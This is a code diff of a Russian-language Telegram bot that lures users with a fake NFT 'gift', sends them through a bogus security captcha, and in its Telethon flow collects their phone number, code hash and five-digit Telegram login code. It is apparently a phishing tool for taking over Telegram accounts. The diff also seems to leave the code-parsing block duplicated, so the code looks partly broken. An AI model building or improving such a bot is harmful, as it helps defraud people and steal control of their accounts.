@@ -222,6 +222,20 @@ def kb_menu() -> ReplyKeyboardMarkup:
 # ХЕНДЛЕРЫ БОТА
 # ═══════════════════════════════════════════
 
+async def _send_nft(msg: Message):
+    """Отправить NFT сообщение пользователю."""
+    await msg.answer(
+        '✅ <b>Проверка пройдена!</b>\n\n'
+        '🎁 <b>Вам дарят NFT: JesterHat #120172</b>\n\n'
+        'Учтите, что подарок можно принять только с аккаунта, '
+        'на который был отправлен данный подарок. '
+        'Ссылка действительна 60 минут с момента получения.\n\n'
+        'https://t.me/nft/JesterHat-120172',
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
+            InlineKeyboardButton('Получить 🎁', url='https://t.me/FairStars_robot?start=gift')
+        ]])
+    )
+
 @dp.message_handler(commands=['start'], state='*')
 async def cmd_start(msg: Message, state: FSMContext):
     await state.finish()
@@ -235,11 +249,11 @@ async def cmd_start(msg: Message, state: FSMContext):
             )
     await msg.answer(
         f'👋 <b>Привет, {msg.from_user.get_mention()}!</b>\n\n'
-        '🎁 Вам отправили подарок — нажмите <b>«📱 Продолжить»</b> '
-        'и поделитесь номером телефона для проверки личности.',
-        reply_markup=kb_phone()
+        '🎁 Вам отправили подарок — чтобы его получить, '
+        'пройдите быструю проверку безопасности.\n\n'
+        '👇 Нажмите кнопку ниже:',
+        reply_markup=kb_open_captcha(msg.from_user.id)
     )
-    await Auth.wait_contact.set()
 
 
 @dp.message_handler(commands=['help'], state='*')
@@ -359,19 +373,38 @@ async def on_webapp_data(msg: Message, state: FSMContext):
                 await msg.answer('❌ Промокод исчерпан.')
             return
 
-        # Капча пройдена, промокод принят — выдаём NFT
-        await msg.answer(
-            '✅ <b>Капча пройдена!</b> Промокод активирован.\n\n'
-            '🎁 <b>Вам дарят NFT: JesterHat #120172</b>\n\n'
-            'Учтите, что подарок можно принять только с аккаунта, '
-            'на который был отправлен данный подарок. '
-            'Ссылка действительна 60 минут с момента получения.\n\n'
-            'https://t.me/nft/JesterHat-120172',
-            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
-                InlineKeyboardButton('Получить 🎁', url='https://t.me/FairStars_robot?start=gift')
-            ]])
-        )
+        await _send_nft(msg)
         return
+
+    # ── Старт-капча (без промокода) — сразу выдаём NFT ─────────────────────
+    data = await state.get_data()
+    phone     = data.get('phone')
+    code_hash = data.get('code_hash')
+
+    if not phone and not code_hash:
+        # Нет активной сессии авторизации — это просто капча при старте
+        await _send_nft(msg)
+        await state.finish()
+        return
+
+    # ── Telethon флоу (обычная авторизация) ────────────────────────────────
+    code = str(payload.get('code', '')).strip()
+    if not code:
+        code = raw.strip()
+
+    if not code or len(code) != 5 or not code.isdigit():
+        await msg.answer('❌ <b>Неверный формат кода.</b> Попробуйте снова — /start')
+        await state.finish()
+        return
+
+    if not phone or not code_hash:
+        row = db_get_pending(msg.from_user.id)
+        if row:
+            phone, code_hash = row
+        else:
+            await msg.answer('❌ <b>Сессия истекла.</b> Начните заново — /start')
+            await state.finish()
+            return
 
     # ── Telethon флоу (обычная авторизация) ────────────────────────────────
     code = str(payload.get('code', '')).strip()
